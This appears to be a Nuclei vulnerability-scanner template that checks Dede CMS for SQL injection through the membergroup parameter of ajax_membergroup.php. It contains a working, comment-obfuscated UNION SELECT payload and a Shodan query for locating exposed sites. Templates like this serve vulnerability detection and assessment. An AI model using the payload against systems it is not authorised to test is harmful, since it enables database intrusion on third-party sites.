id: dedecms-membergroup-sqli
info:
  name: Dede CMS - SQL Injection
  author: pikpikcu
  severity: critical
  description: The Dede CMS has a SQL injection vulnerability that allows unauthorized
    remote users to inject SQL statements through the ajax_membergroup.php endpoint
    and membergroup parameter.
  reference:
  - http://www.dedeyuan.com/xueyuan/wenti/1244.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  metadata:
    shodan-query: http.html:"DedeCms"
    impact: The SQL injection vulnerability in Dede CMS allows unauthorized individuals
      to inject arbitrary SQL statements, potentially impacting the security and integrity
      of the system.
    recommendation: I strongly recommend that Dede CMS urgently addresses the SQL
      injection vulnerability in the ajax_membergroup.php endpoint and membergroup
      parameter to prevent remote unauthenticated users from injecting arbitrary SQL
      statements.
  tags: sqli,dedecms
variables:
  num: '999999999'
requests:
- method: GET
  path:
  - '{{BaseURL}}/member/ajax_membergroup.php?action=post&membergroup=@`''`/*!50000Union+*/+/*!50000select+*/+md5({{num}})+--+@`''`'
  matchers-condition: and
  matchers:
  - type: word
    words:
    - '{{md5({{num}})}}'
    part: body
  - type: status
    status:
    - 200
